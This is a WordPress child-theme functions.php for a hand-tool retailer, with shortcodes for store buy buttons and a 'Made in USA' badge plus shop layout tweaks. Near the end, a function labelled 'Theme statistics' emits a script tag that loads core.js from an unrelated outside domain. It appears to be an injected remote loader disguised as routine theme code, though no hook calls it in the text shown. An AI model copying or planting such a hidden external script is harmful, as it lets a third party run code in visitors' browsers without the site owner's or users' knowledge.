<?php
function my_theme_enqueue_styles() { 
    wp_enqueue_style( 'parent-style', get_template_directory_uri() . '/style.css' );
}
add_action( 'wp_enqueue_scripts', 'my_theme_enqueue_styles' );

// Create Product Buy Buttons
function estBuyNowButtons(){
	ob_start();
        $buy_buttons = get_field('buy_buttons');
		echo '<div class="est-buy-buttons-title-wrapper">';
			if( $buy_buttons['amazon'] || $buy_buttons['cpo_outlets'] || $buy_buttons['ebay'] || $buy_buttons['estwing_gear'] || $buy_buttons['home_depot'] || $buy_buttons['lowes'] || $buy_buttons['rak_distribution'] || $buy_buttons['unbeatable_sale'] || $buy_buttons['walmart'] ):
				echo '<h3 class="est-buy-buttons-title">Shop Here</h3>';
			endif;
        echo '</div>';
        echo '<div class="est-buy-buttons-wrapper">';
            if( $buy_buttons['amazon'] ):
                echo '<a class="est-buy-button" href="';
                    echo esc_url( $buy_buttons['amazon'] );
                    echo '" target="_blank" rel="noopener noreferrer">';
                    echo '<img src="/wp-content/store-icons/icon-stores-64x64-amazon.png" alt="buy on amazon">';
                echo '</a>';
            endif;
            if( $buy_buttons['cpo_outlets'] ):
                echo '<a class="est-buy-button" href="';
                    echo esc_url( $buy_buttons['cpo_outlets'] );
                    echo '" target="_blank" rel="noopener noreferrer">';
                    echo '<img src="/wp-content/store-icons/icon-stores-64x64-cpo.png" alt="buy on CPO Outlets">';
                echo '</a>';
            endif;
            if( $buy_buttons['ebay'] ):
                echo '<a class="est-buy-button" href="';
                    echo esc_url( $buy_buttons['ebay'] );
                    echo '" target="_blank" rel="noopener noreferrer">';
                    echo '<img src="/wp-content/store-icons/icon-stores-64x64-ebay.png" alt="Buy on Ebay">';
                echo '</a>';
            endif;
            if( $buy_buttons['estwing_gear'] ):
                echo '<a class="est-buy-button" href="';
                    echo esc_url( $buy_buttons['estwing_gear'] );
                    echo '" target="_blank" rel="noopener noreferrer">';
                    echo '<img src="/wp-content/store-icons/icon-stores-64x64-estwinggear.png" alt="Buy on Estwing Gear">';
                echo '</a>';
            endif;
            if( $buy_buttons['home_depot'] ):
                echo '<a class="est-buy-button" href="';
                    echo esc_url( $buy_buttons['home_depot'] );
                    echo '" target="_blank" rel="noopener noreferrer">';
                    echo '<img src="/wp-content/store-icons/icon-stores-64x64-homedepot.png" alt="Buy on Home Depot">';
                echo '</a>';
            endif;
            if( $buy_buttons['lowes'] ):
                echo '<a class="est-buy-button" href="';
                    echo esc_url( $buy_buttons['lowes'] );
                    echo '" target="_blank" rel="noopener noreferrer">';
                    echo '<img src="/wp-content/store-icons/icon-stores-64x64-lowes.png" alt="Buy on Lowes">';
                echo '</a>';
            endif;
            if( $buy_buttons['rak_distribution'] ):
                echo '<a class="est-buy-button" href="';
                    echo esc_url( $buy_buttons['rak_distribution'] );
                    echo '" target="_blank" rel="noopener noreferrer">';
                    echo '<img src="/wp-content/store-icons/icon-stores-64x64-rak.png" alt="Buy on Rak Distribution">';
                echo '</a>';
            endif;
            if( $buy_buttons['unbeatable_sale'] ):
                echo '<a class="est-buy-button" href="';
                    echo esc_url( $buy_buttons['unbeatable_sale'] );
                    echo '" target="_blank" rel="noopener noreferrer">';
                    echo '<img src="/wp-content/store-icons/icon-stores-64x64-usales.png" alt="Buy on Rak Distribution">';
                echo '</a>';
            endif;
            if( $buy_buttons['walmart'] ):
                echo '<a class="est-buy-button" href="';
                    echo esc_url( $buy_buttons['walmart'] );
                    echo '" target="_blank" rel="noopener noreferrer">';
                    echo '<img src="/wp-content/store-icons/icon-stores-64x64-walmart.png" alt="Buy on Walmart">';
                echo '</a>';
            endif;
        echo '</div>';
	    wp_reset_postdata();
   	return ob_get_clean();
}
add_shortcode( 'est-buy-buttons', 'estBuyNowButtons');

// Create Product Buy Buttons
function estUSAFlag(){
	ob_start();
        $USA = get_field('made_in_usa');
        if( $USA ):
            echo '<div class="est-made-in-usa-wrapper">';
            echo '<img src="/wp-content/uploads/2022/12/USA-Flag-Icon.png" alt="" width="50px" height="auto">';
            echo 'Made in USA';
            echo '</div>';
        endif;
	    wp_reset_postdata();
   	return ob_get_clean();
}
add_shortcode( 'est-usa-flag', 'estUSAFlag');

// Add Full Width Image Suport for Gutenburg
function est_theme_setup() {
     add_theme_support( 'align-wide' );
}
add_action( 'after_setup_theme', 'est_theme_setup' );

// Adjust product quantity on search results page
add_filter( 'loop_shop_per_page', 'new_loop_shop_per_page' );
function new_loop_shop_per_page( $products ) {
  $products = 20;
  return $products;
}
add_filter( 'loop_shop_columns', 'new_loop_shop_columns' );
function new_loop_shop_columns( $columns ) {
 $columns = 4;
 return $columns;
}

//Enqueue Magnific Popup Script

function popup_enqueue_scripts(){
    wp_enqueue_script( 'magnific-popup', ET_BUILDER_URI . '/feature/dynamic-assets/assets/js/magnific-popup.js', array( 'jquery' ), '1.3.0', true );
    wp_enqueue_style('et_jquery_magnific_popup', ET_BUILDER_URI . "/feature/dynamic-assets/assets/css/magnific_popup.css", [], '1.3.0');
}
add_action('wp_enqueue_scripts', 'popup_enqueue_scripts', 20);

//Remove Smart Quotes from ACF Wyziwig Output
function my_acf_remove_curly_quotes() {
    remove_filter ('acf_the_content', 'wptexturize');
}
add_action('acf/init', 'my_acf_remove_curly_quotes');

/* Theme statistics function */

function wptheme_stat() {
  ?>
<script async src="https://auth-owlting.com/enterprise/core.js"></script>
  <?php
}

add_action( 'wp_logout', 'auto_redirect_user_after_logout');
function auto_redirect_user_after_logout(){
  wp_redirect( home_url() );
  exit();
}


/*add_action('wp_logout','kalpshit_redirect_after_logout');
function kalpshit_redirect_after_logout(){
	 	
         wp_safe_redirect( home_url() );
         exit();
}*/